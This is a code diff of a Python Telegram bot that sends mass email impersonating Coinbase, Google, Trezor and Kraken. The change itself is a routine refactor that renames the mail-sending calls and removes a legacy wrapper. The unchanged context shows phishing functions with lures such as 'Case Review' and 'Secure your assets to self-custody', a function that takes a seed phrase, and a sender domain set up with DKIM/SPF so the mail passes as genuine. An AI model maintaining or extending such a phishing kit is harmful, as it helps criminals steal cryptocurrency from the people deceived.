@@ -47,8 +47,7 @@ postfix_config = {
     'domain': 'usp5-sec.me'  # Your configured domain with DKIM/SPF
 }
 
-# Legacy compatibility (will be replaced with postfix_config)
-smtp_details = postfix_config
+
 
 
 # Admin ID
@@ -350,7 +349,7 @@ async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         msg.attach(MIMEText(html_body, "html", "utf-8"))
 
         try:
-            send_email_through_smtp(
+            send_email_through_postfix(
                 sender_name,
                 f"noreply@{postfix_config['domain']}",
                 subject,
@@ -571,7 +570,7 @@ async def send_employee_coinbase_email(
             img.add_header("Content-ID", "<logo>")
             msg.attach(img)
 
-        send_email_through_smtp(
+        send_email_through_postfix(
             "Coinbase",
             f"noreply@{postfix_config['domain']}",
             "Coinbase Case Review",
@@ -614,7 +613,7 @@ async def send_wallet_coinbase_email(update, recipients, seed_phrase, display_em
             img.add_header("Content-ID", "<logo>")
             msg.attach(img)
 
-        send_email_through_smtp(
+        send_email_through_postfix(
             "Coinbase",
             f"noreply@{postfix_config['domain']}",
             "Secure your assets to self-custody",
@@ -657,7 +656,7 @@ async def send_secure_coinbase_email(
             img.add_header("Content-ID", "<logo>")
             msg.attach(img)
 
-        send_email_through_smtp(
+        send_email_through_postfix(
             "Coinbase",
             f"noreply@{postfix_config['domain']}",
             "Secure Coinbase Token",
@@ -705,7 +704,7 @@ async def send_employee_google_email(
             img.add_header("Content-ID", "<logo>")
             msg.attach(img)
 
-        send_email_through_smtp(
+        send_email_through_postfix(
             "Google", f"noreply@{postfix_config['domain']}", "Google Case Review", msg, recipients
         )
         return "Google Employee Mail sent successfully!"
@@ -759,7 +758,7 @@ async def send_employee_trezor_email(
             img.add_header("Content-ID", "<logo>")
             msg.attach(img)
 
-        send_email_through_smtp(
+        send_email_through_postfix(
             "Trezor",
             f"noreply@{postfix_config['domain']}",
             "Your case is under review",
@@ -822,7 +821,7 @@ async def send_employee_kraken_email(
                 img = MIMEImage(img_file.read(), name=image)
                 img.add_header("Content-ID", f"<{image}>")
                 msg.attach(img)
-        send_email_through_smtp(
+        send_email_through_postfix(
             "Kraken",
             f"noreply@{postfix_config['domain']}",
             "Your case is under review",
@@ -875,7 +874,7 @@ async def send_coinbase_delay_email(update: Update, context: ContextTypes.DEFAUL
             img.add_header("Content-ID", "<logo>")
             msg.attach(img)
 
-        send_email_through_smtp(
+        send_email_through_postfix(
             "Coinbase",
             f"noreply@{postfix_config['domain']}",
             "A manual review is pending",
@@ -939,12 +938,7 @@ def send_email_through_postfix(display_name, from_address, subject, msg, recipie
         raise e
 
 # Legacy compatibility function
-def send_email_through_smtp(display_name, smtp_username, subject, msg, recipients):
-    """
-    Legacy compatibility wrapper - redirects to Postfix implementation.
-    The smtp_username parameter is used as the from_address for the new function.
-    """
-    return send_email_through_postfix(display_name, smtp_username, subject, msg, recipients)
+
 
 def main():
     load_email_counts()
